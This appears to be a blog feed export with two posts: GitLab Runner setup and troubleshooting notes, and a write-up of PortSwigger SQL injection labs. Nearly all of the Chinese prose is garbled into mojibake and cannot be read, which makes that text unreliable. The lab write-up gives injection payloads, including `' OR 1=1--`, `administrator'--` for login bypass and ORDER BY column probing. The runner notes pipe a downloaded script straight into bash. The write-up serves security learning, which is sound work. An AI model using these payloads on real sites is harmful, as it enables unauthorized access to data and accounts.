<li>å¿…è¦æ¡ä»¶ï¼š<code>Administrator</code> &#x2F; <code>Owner of the group</code></li>
<li>åœ¨<code>Group sidebar-&gt;Builds-&gt;Runners-&gt;Group Runners</code>ä¸­é€‰æ‹©è¦æš‚åœçš„runnerï¼Œç„¶åç‚¹å‡»<code>Pause</code>ã€‚</li>
</ul>
</li>
<li>æ¢å¤ï¼š<ul>
<li>å¿…è¦æ¡ä»¶ï¼š<code>Administrator</code> &#x2F; <code>Owner of the group</code></li>
<li>åœ¨<code>Group sidebar-&gt;Builds-&gt;Runners-&gt;Group Runners</code>ä¸­é€‰æ‹©è¦æ¢å¤çš„runnerï¼Œç„¶åç‚¹å‡»<code>Resume</code>ã€‚</li>
</ul>
</li>
<li>åˆ é™¤ï¼š<ul>
<li>å¿…è¦æ¡ä»¶ï¼š<code>Administrator</code> &#x2F; <code>Owner of the group</code></li>
<li>åœ¨<code>Group sidebar-&gt;Builds-&gt;Runners-&gt;Group Runners</code>ä¸­é€‰æ‹©è¦åˆ é™¤çš„runnerï¼Œç„¶åç‚¹å‡»<code>Delete</code>ã€‚</li>
</ul>
</li>
<li>æ¸…ç†ï¼š<ul>
<li>å¿…è¦æ¡ä»¶ï¼š<code>Owner of the group</code></li>
<li>ï¼ˆï¼Ÿæ²¡çœ‹åˆ°è¿™ä¸ªï¼‰åœ¨<code>Group sidebar-&gt;Settings-&gt;CI/CD-&gt;Runners</code>ï¼Œç„¶åç‚¹å‡»<code>Enable stale runner cleanup</code>ã€‚</li>
</ul>
</li>
</ul>
<h2 id="Project-Runner-é…ç½®åŠä½¿ç”¨"><a href="#Project-Runner-é…ç½®åŠä½¿ç”¨" class="headerlink" title="Project Runner é…ç½®åŠä½¿ç”¨"></a>Project Runner é…ç½®åŠä½¿ç”¨</h2><ul>
<li>project runnerçš„é…ç½®ä¸group runnerç±»ä¼¼ï¼Œéœ€è¦åœ¨ç‰¹å®šé¡¹ç›®çš„<code>Settings-&gt;CI/CD-&gt;Runners</code>ä¸­é€‰æ‹©<code>New project runner</code>ã€‚</li>
<li>project runnerè™½ç„¶ä¸ç‰¹å®šé¡¹ç›®ç›¸å…³ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å°†å…¶å¼€æ”¾éç»™åŒç»„çš„å…¶ä»–é¡¹ç›®ã€‚</li>
<li>å¹¶ä¸”ï¼Œproject runnerä½¿ç”¨dockeræ‰§è¡Œä½œä¸šæ²¡æœ‰é—®é¢˜ã€‚</li>
</ul>
<h2 id="ç®€å•çš„-gitlab-ci-ymlç¤ºä¾‹"><a href="#ç®€å•çš„-gitlab-ci-ymlç¤ºä¾‹" class="headerlink" title="ç®€å•çš„.gitlab-ci.ymlç¤ºä¾‹"></a>ç®€å•çš„.gitlab-ci.ymlç¤ºä¾‹</h2><ul>
<li>ç¤ºä¾‹ï¼š<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">stages:</span> <span class="comment"># å®šä¹‰æµç¨‹é˜¶æ®µ, é¡ºåºæ‰§è¡Œï¼Œé€šå¸¸åŒ…æ‹¬buildã€testã€deployç­‰</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">build</span> <span class="comment"># æ„å»º</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">test</span> <span class="comment"># æµ‹è¯•</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">deploy</span> <span class="comment"># éƒ¨ç½²</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build-job:</span>   <span class="comment"># å®šä¹‰job</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span>  <span class="comment"># æŒ‡å®šjobæ‰€å±çš„stage</span></span><br><span class="line">  <span class="attr">tag:</span> <span class="string">ubuntu-shell</span> <span class="comment"># æŒ‡å®šrunnerçš„tag</span></span><br><span class="line">  <span class="attr">script:</span> <span class="comment"># å®šä¹‰jobçš„æ‰§è¡Œè„šæœ¬</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Building the app&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test-job-1:</span> </span><br><span class="line">  <span class="attr">stage:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Testing the app&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test-job-2:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Testing the app&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Deploying the app&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="â­é—®é¢˜è®°å½•"><a href="#â­é—®é¢˜è®°å½•" class="headerlink" title="â­é—®é¢˜è®°å½•"></a>â­é—®é¢˜è®°å½•</h2><ol>
<li><p>BUG1ï¼šæ— æ³•å®‰è£…<code>GitLab Runner</code></p>
<ul>
<li>é—®é¢˜æè¿°ï¼š   <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dd-group-runner:~# apt install gitlab-runner</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">E: Unable to locate package gitlab-runner</span><br></pre></td></tr></table></figure></li>
<li>è§£å†³æ–¹æ¡ˆï¼š<a href="https://zhuanlan.zhihu.com/p/590406526">å‚è€ƒ</a>ï¼Œå…ˆå»å®˜ç½‘ä¸‹è½½å®‰è£…å¯†é’¥ï¼Œç„¶åå®‰è£…ã€‚   <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -L &quot;https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh&quot; | bash</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>BUG2ï¼šæ³¨å†Œæ—¶è®¤è¯é—®é¢˜</p>
<ul>
<li>é—®é¢˜æè¿°ï¼šx.509è¯ä¹¦é—®é¢˜   <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@shell-2:~# gitlab-runner register  --url https://gitee.xxxx.lab  --token glrt-xxxxxGndzm3iDm</span><br><span class="line">Runtime platform                                    arch=amd64 os=linux pid=31185 revision=782c6ecb version=16.9.1</span><br><span class="line">Running in system-mode.</span><br><span class="line"></span><br><span class="line">Enter the GitLab instance URL (for example, https://gitlab.com/):</span><br><span class="line">[https://gitee.xxxxx.lab]: https://gitee.xxxxx.lab</span><br><span class="line">ERROR: Verifying runner... failed                   runner=zoYseyDEo status=couldn&#x27;t execute POST against https://gitee.xxxxx.lab/api/v4/runners/verify: Post &quot;https://gitee.xxxxx.lab/api/v4/runners/verify&quot;: tls: failed to verify certificate: x509: certificate signed by unknown authority</span><br><span class="line">PANIC: Failed to verify the runner.</span><br></pre></td></tr></table></figure></li>
<li>è§£å†³æ–¹æ¡ˆï¼šæ‰‹åŠ¨æ·»åŠ gitlabè¯ä¹¦å¹¶æ›´æ–°<code>ca-certificates</code>ã€‚<ul>
<li>é¦–å…ˆï¼Œè·å–æœåŠ¡å™¨çš„è¯ä¹¦ã€‚å¯ä»¥ä½¿ç”¨<code>openssl s_client</code>å‘½ä»¤è¿æ¥åˆ°æœåŠ¡å™¨å¹¶è¾“å‡ºè¯ä¹¦ä¿¡æ¯: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl s_client -showcerts -connect xxxx:443 &lt;/dev/null</span><br></pre></td></tr></table></figure></li>
<li>å¤åˆ¶è¾“å‡ºçš„è¯ä¹¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç¬¬ä¸€ä¸ª<code>-----BEGIN CERTIFICATE-----</code>å’Œæœ€åä¸€ä¸ª<code>-----END CERTIFICATE-----</code>ä¹‹é—´çš„å†…å®¹ã€‚</li>
<li>å°†è¯ä¹¦å†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚<code>server.crt</code>ã€‚</li>
<li>å°†è¯ä¹¦æ–‡ä»¶å¤åˆ¶åˆ°<code>/etc/ssl/certs/</code>ç›®å½•ä¸‹ï¼š <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp server.crt /etc/ssl/certs/</span><br></pre></td></tr></table></figure></li>
<li>æ›´æ–°<code>ca-certificates</code>: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-ca-certificates</span><br></pre></td></tr></table></figure></li>
<li>æ‰§è¡Œå®Œä»¥ä¸Šæ­¥éª¤åï¼ŒæœåŠ¡å™¨çš„è¯ä¹¦å°±ä¼šè¢«æ·»åŠ åˆ°ç³»ç»Ÿçš„ä¿¡ä»»åˆ—è¡¨ä¸­ï¼Œgitlab-runneråº”è¯¥èƒ½å¤ŸéªŒè¯æœåŠ¡å™¨è¯ä¹¦å¹¶è¿æ¥åˆ°æŒ‡å®šçš„gitä»“åº“äº†ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p>BUG3ï¼šdocker å®¹å™¨å†…æ— æ³•è·å–gitlab ä»“åº“ä»£ç </p>
<ul>
<li>é—®é¢˜æè¿°ï¼š <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fatal: unable to access &#x27;https://xxxx/dd/test-cicd.git/&#x27;: Could not resolve host: xxxx</span><br></pre></td></tr></table></figure></li>
<li>è§£å†³æ–¹æ¡ˆï¼š<ul>
<li>æ–¹æ³•1ï¼š<ul>
<li>è®¾ç½® network_mode ä¸º hostï¼Œ<a href="https://stackoverflow.com/questions/50325932/gitlab-runner-docker-could-not-resolve-host">å‚è€ƒ</a> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi  /etc/gitlab-runner/config.toml</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   [runners.docker]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">       network_mode = <span class="string">&quot;host&quot;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>é‡å¯<code>gitlab runner</code>ï¼Œæ‰§è¡Œ<code>gitlab-runner restart</code></li>
</ul>
</li>
<li>æ–¹æ³•2ï¼š<ul>
<li>åœ¨<code>/etc/gitlab-runner/config.toml</code>ä¸­<code>[runners.docker]</code>ä¸‹æ·»åŠ <code>extra_hosts</code>å­—æ®µ<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extra_hosts = [&quot;host:ip&quot;]</span><br></pre></td></tr></table></figure></li>
<li>é‡å¯<code>gitlab runner</code>ï¼Œæ‰§è¡Œ<code>gitlab-runner restart</code></li>
</ul>
</li>
</ul>
</li>
<li><p>BUG4ï¼šdockerå®¹å™¨æ— æ³•è·å–gitä»“åº“ä»£ç </p>
</li>
</ol>
<ul>
<li>é—®é¢˜æè¿°ï¼š<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Getting source from Git repository</span><br><span class="line">00:01</span><br><span class="line">Fetching changes with git depth set to 20...</span><br><span class="line">Reinitialized existing Git repository in /builds/xxxxx/.git/</span><br><span class="line">fatal: unable to access &#x27;https://xxxx.git/&#x27;: HTTP/2 stream 1 was not closed cleanly: PROTOCOL_ERROR (err 1)</span><br><span class="line">Cleaning up project directory and file based variables</span><br></pre></td></tr></table></figure></li>
<li>è§£å†³æ–¹æ¡ˆï¼šæš‚æœªè§£å†³</li>
<li>å°è¯•çš„è§£å†³æ–¹æ³•ï¼š<ul>
<li>æœç´¢è¯¥æŠ¥é”™ï¼Œæœ‰äº›è§£å†³æ–¹æ³•æ˜¯é…ç½®gitå‚æ•°ï¼Œä½¿ç”¨åŸºäºubuntu:jammyåˆ›å»ºé…ç½®å¥½gitå‚æ•°çš„é•œåƒï¼Œä½†æ˜¯è¿˜æ˜¯æŠ¥é”™ã€‚</li>
<li>ä½¿ç”¨sshæ–¹å¼cloneï¼Œå¤±è´¥ã€‚</li>
</ul>
</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li><a href="https://docs.gitlab.com/ee/ci/runners/runners_scope.html#group-runners">Manage runners | GitLab</a></li>
</ul>
]]></content>
      <tags>
        <tag>æ•™ç¨‹</tag>
        <tag>ci/cd</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-portswigger-SQLæ³¨å…¥ç³»åˆ—</title>
    <url>/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<span id="more"></span>


<h2 id="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ</h2><p><a href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">SQL æ³¨å…¥å°±æ˜¯å€ŸåŠ©ç½‘ç«™ä¸Šä¸å¥å…¨çš„ SQL æ‹¼æ¥è¯­å¥ï¼Œå°†æ”»å‡»è€…è‡ªå·±çš„ payload æ‹¼æ¥åˆ°åŸæœ‰çš„ SQL è¯­å¥ä¸­ï¼Œä½¿å…¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¶æ„ SQL è¯­å¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œç½‘ç«™è¿è¥è€…é¢„æ–™ä¹‹å¤–çš„å¢ã€åˆ ã€æ”¹ã€æŸ¥æ“ä½œã€‚</a></p>
<h2 id="å¦‚ä½•æ£€æµ‹SQLæ³¨å…¥æ¼æ´"><a href="#å¦‚ä½•æ£€æµ‹SQLæ³¨å…¥æ¼æ´" class="headerlink" title="å¦‚ä½•æ£€æµ‹SQLæ³¨å…¥æ¼æ´"></a>å¦‚ä½•æ£€æµ‹SQLæ³¨å…¥æ¼æ´</h2><ul>
<li>æ‰‹å·¥SQLæ³¨å…¥æµ‹è¯•ï¼š<ul>
<li>å•åŒå¼•å·ï¼šâ€™ â€œ ï¼ŒæŸ¥çœ‹æ˜¯å¦æŠ¥é”™</li>
<li>ç®—æ•°è¿ç®—ï¼šæ¯”å¦‚åœ¨id&#x3D;2çš„åœ°æ–¹è¾“å…¥id&#x3D;1+1ï¼ŒæŸ¥çœ‹è¿”å›æ•°æ®æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´è¯´æ˜å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹</li>
<li>å¸ƒå°”æ¡ä»¶ï¼šæ¯”å¦‚ OR 1&#x3D;1 å’Œ OR 1&#x3D;2 ï¼Œæ¯”è¾ƒä¸¤ä¸ªå“åº”æ˜¯å¦æœ‰å·®å¼‚ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå‰è€…è¿”å›çš„æ•°æ®é€šå¸¸æ˜¯æ¯”åè€…å¤šçš„</li>
<li>æ—¶é—´å»¶è¿Ÿï¼šæ¯”å¦‚ sleep(5)ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œé‚£ä¹ˆæºå¸¦ payload çš„è¯·æ±‚ï¼Œå…¶å“åº”æ—¶é—´åº”è¯¥ä¼šæ¯”æ­£å¸¸çš„è¯·æ±‚æ…¢ 5 ç§’</li>
<li>å¸¦å¤–æµ‹è¯•ï¼ˆï¼Ÿï¼‰ï¼šæŸ¥çœ‹ä½ çš„å¸¦å¤–å¹³å°æ˜¯å¦æ”¶åˆ°äº†å¯¹åº”çš„æ•°æ®</li>
</ul>
</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•ï¼š<ul>
<li>burp scannerï¼šburp suite è‡ªå¸¦çš„æ‰«æå™¨ï¼Œè‡ªåŠ¨åŒ–æ£€æµ‹SQLæ³¨å…¥æ¼æ´</li>
</ul>
</li>
<li>SQLæ³¨å…¥ç‚¹ï¼š<ul>
<li><code>SELECT</code>è¯­å¥ï¼š<code>WHERE</code>çš„å­å¥</li>
<li><code>UPDATE</code>è¯­å¥ï¼š<code>UPDATE</code>çš„å€¼æˆ–è€…<code>WHERE</code>çš„å­å¥</li>
<li><code>INSERT</code>è¯­å¥ï¼š<code>INSERT</code>çš„å€¼</li>
<li><code>SELECT</code>è¯­å¥ï¼šè¡¨åæˆ–åˆ—å</li>
<li><code>SELECT</code>è¯­å¥ï¼š<code>ORDER BY</code>å­å¥</li>
</ul>
</li>
</ul>
<h2 id="æ£€ç´¢éšè—æ•°æ®"><a href="#æ£€ç´¢éšè—æ•°æ®" class="headerlink" title="æ£€ç´¢éšè—æ•°æ®"></a>æ£€ç´¢éšè—æ•°æ®</h2><ul>
<li><code>--</code>æ˜¯SQLæ³¨é‡Šç¬¦ï¼Œå¯ä»¥æ³¨é‡Šæ‰åé¢çš„å†…å®¹</li>
<li>åœ¨ä½¿ç”¨<code>OR 1=1</code>çš„æ—¶å€™è¦å°å¿ƒï¼Œå¦‚æœåœ¨updateæˆ–deleteè¯­å¥ä¸­ä½¿ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®æ„å¤–ä¸¢å¤±</li>
</ul>
<h3 id="ğŸ§ªå®éªŒ1ï¼šWHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®"><a href="#ğŸ§ªå®éªŒ1ï¼šWHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®" class="headerlink" title="ğŸ§ªå®éªŒ1ï¼šWHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®"></a>ğŸ§ªå®éªŒ1ï¼šWHEREå­å¥ä¸­çš„SQLæ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®</h3><h4 id="å®éªŒè¯´æ˜"><a href="#å®éªŒè¯´æ˜" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><p>æœ¬å®éªŒåœ¨äº§å“ç±»åˆ«ç­›é€‰å™¨ä¸­åŒ…å«ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚å½“ç”¨æˆ·é€‰æ‹©ä¸€ä¸ªç±»åˆ«æ—¶ï¼Œåº”ç”¨ç¨‹åºæ‰§è¡Œå¦‚ä¸‹çš„SQLæŸ¥è¯¢ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ä»»åŠ¡ï¼šæ‰§è¡ŒSQLæ³¨å…¥æ”»å‡»ï¼Œä½¿åº”ç”¨ç¨‹åºæ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæœªå‘å¸ƒçš„äº§å“</p>
<h4 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>é€‰æ‹©ä¸€ä¸ªç±»åˆ«ï¼Œç„¶åæŸ¥çœ‹URLä¸­çš„å‚æ•°<br><code>filter?category=Accessories</code></li>
<li>ä¿®æ”¹URLä¸­çš„å‚æ•°ï¼Œå°è¯•ä½¿ç”¨<code>&#39;</code>å’Œ<code>&quot;</code>ï¼Œæ²¡æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹</li>
<li>æ„é€ payloadï¼š<code>&#39; OR 1=1--</code>ï¼ŒæŸ¥çœ‹è¿”å›æ•°æ®ï¼Œå‘ç°äº§å“æ•°é‡å˜å¤šï¼Œå®Œæˆå®éªŒâœ…<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB1-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png"></li>
</ul>
<h2 id="é¢ è¦†åº”ç”¨é€»è¾‘"><a href="#é¢ è¦†åº”ç”¨é€»è¾‘" class="headerlink" title="é¢ è¦†åº”ç”¨é€»è¾‘"></a>é¢ è¦†åº”ç”¨é€»è¾‘</h2><ul>
<li>å¯¹äºæ‰§è¡Œä»¥ä¸‹SQLæ¥æ£€æŸ¥å‡­æ®ï¼Œå¦‚æœæŸ¥è¯¢è¿”å›ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œåˆ™ç™»å½•æˆåŠŸï¼Œå¦åˆ™ï¼Œç™»å½•å¤±è´¥<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥ä»¥ä»»ä½•èº«ä»½ç™»å½•ï¼Œè€Œæ— éœ€å¯†ç ã€‚é€šè¿‡<code>--</code>æ³¨é‡Šæ‰å¯†ç çš„åˆ¤æ–­ï¼Œå³å¯ç™»å½•æˆåŠŸã€‚</li>
<li>ä¾‹å­ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;administrator&#x27;</span><span class="comment">--&#x27; AND password = &#x27;&#x27;</span></span><br><span class="line"># æ­¤æŸ¥è¯¢å°†è¿”å›usernameä¸ºadministratorçš„ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦å¯†ç </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="ğŸ§ªå®éªŒ2ï¼šå…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´"><a href="#ğŸ§ªå®éªŒ2ï¼šå…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´" class="headerlink" title="ğŸ§ªå®éªŒ2ï¼šå…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´"></a>ğŸ§ªå®éªŒ2ï¼šå…è®¸ç»•è¿‡ç™»å½•çš„SQLæ³¨å…¥æ¼æ´</h3><h4 id="å®éªŒè¯´æ˜-1"><a href="#å®éªŒè¯´æ˜-1" class="headerlink" title="å®éªŒè¯´æ˜"></a>å®éªŒè¯´æ˜</h4><ul>
<li>ä¸€ä¸ªå­˜åœ¨SQLæ³¨å…¥æ¼æ´çš„ç™»å½•è¡¨å•</li>
<li>ä»»åŠ¡ï¼šç»•è¿‡ç™»å½•ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•</li>
</ul>
<h4 id="è§£é¢˜è¿‡ç¨‹-1"><a href="#è§£é¢˜è¿‡ç¨‹-1" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ç”¨æˆ·åå¤„è¾“å…¥<code>administrator&#39;--</code>ï¼Œå¯†ç éšæ„<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB2-1-payload.png"></li>
<li>ç™»å½•æˆåŠŸâœ…</li>
</ul>
<h2 id="SQLæ³¨å…¥UNIONæ”»å‡»"><a href="#SQLæ³¨å…¥UNIONæ”»å‡»" class="headerlink" title="SQLæ³¨å…¥UNIONæ”»å‡»"></a>SQLæ³¨å…¥UNIONæ”»å‡»</h2><ul>
<li>å½“åº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»æ—¶ä¸”æŸ¥è¯¢ç»“æœåœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>UNION</code>å…³é”®å­—ä»æ•°æ®åº“ä¸­çš„å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºSQLæ³¨å…¥UNIONæ”»å‡»ã€‚</li>
<li><code>UNION</code>å…³é”®å­—å¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªå…¶ä»–<code>SELECT</code>æŸ¥è¯¢ï¼Œå¹¶å°†ç»“æœåˆå¹¶åˆ°åŸå§‹æŸ¥è¯¢çš„ç»“æœä¸­ã€‚</li>
<li>ä¾‹å­ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a,b <span class="keyword">FROM</span> table1 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> c,d <span class="keyword">FROM</span> table2</span><br><span class="line"># æ­¤<span class="keyword">SQL</span>æŸ¥è¯¢è¿”å›ä¸€ä¸ªåŒ…å«ä¸¤åˆ—çš„ç»“æœé›†ï¼Œå…¶ä¸­åŒ…å«æ¥è‡ªtable1çš„aå’Œbåˆ—çš„æ•°æ®ï¼Œä»¥åŠæ¥è‡ªtable2çš„cå’Œdåˆ—çš„æ•°æ®</span><br></pre></td></tr></table></figure></li>
<li><code>UNION</code>æŸ¥è¯¢æœ‰æ•ˆçš„ä¸¤ä¸ªå…³é”®è¦æ±‚ï¼š<ul>
<li>å„ä¸ªæŸ¥è¯¢å¿…é¡»è¿”å›ç›¸åŒæ•°é‡çš„åˆ—</li>
<li>å„ä¸ªåˆ—ä¸­çš„æ•°æ®ç±»å‹å¿…é¡»åœ¨å„ä¸ªæŸ¥è¯¢ä¹‹é—´å…¼å®¹</li>
</ul>
</li>
<li>æ‰§è¡ŒSQLæ³¨å…¥UNIONæ”»å‡»å¿…é¡»æ»¡è¶³çš„è¦æ±‚ï¼š<ul>
<li>ä»åŸå§‹æŸ¥è¯¢è¿”å›å¤šå°‘åˆ—</li>
<li>ä»åŸå§‹æŸ¥è¯¢è¿”å›çš„é‚£äº›åˆ—çš„æ•°æ®ç±»å‹é€‚åˆä¿å­˜æ’å…¥æŸ¥è¯¢çš„ç»“æœ</li>
</ul>
</li>
</ul>
<h2 id="ç¡®å®šæ‰€éœ€çš„åˆ—æ•°"><a href="#ç¡®å®šæ‰€éœ€çš„åˆ—æ•°" class="headerlink" title="ç¡®å®šæ‰€éœ€çš„åˆ—æ•°"></a>ç¡®å®šæ‰€éœ€çš„åˆ—æ•°</h2><ul>
<li>åœ¨æ‰§è¡ŒSQLæ³¨å…¥UNIONæ”»å‡»æ—¶ï¼Œæœ‰ä¸¤ç§æœ‰æ•ˆçš„æ–¹æ³•å¯ä»¥ç¡®å®šä»åŸå§‹æŸ¥è¯¢è¿”å›çš„åˆ—æ•°ï¼š<ul>
<li>ä½¿ç”¨ä¸€ç³»åˆ—<code>ORDER BY</code>å­å¥ï¼Œç›´åˆ°åº”ç”¨ç¨‹åºè¿”å›é”™è¯¯<ul>
<li>ä¾‹å­ï¼š  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ORDER BY 1--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; ORDER BY 3--</span></span><br><span class="line"><span class="string">etc.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># è¿™ä¸€ç³»åˆ—æœ‰æ•ˆè´Ÿè½½ä¿®æ”¹äº†åŸå§‹æŸ¥è¯¢ï¼ŒæŒ‰ç…§ç»“æœé›†ä¸­ä¸åŒåˆ—å¯¹ç»“æœè¿›è¡Œæ’åº</span></span><br><span class="line"><span class="string"># `ORDER BY`å­å¥ä¸­çš„åˆ—å¯ä»¥ç”±å…¶ç´¢å¼•æŒ‡å®šï¼Œå› æ­¤ä¸éœ€è¦çŸ¥é“ä»»ä½•åˆ—å</span></span><br><span class="line"><span class="string"># å½“æŒ‡å®šçš„åˆ—ç´¢å¼•è¶…å‡ºäº†ç»“æœé›†ä¸­çš„åˆ—æ•°æ—¶ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸ä¼šè¿”å›é”™è¯¯</span></span><br></pre></td></tr></table></figure></li>
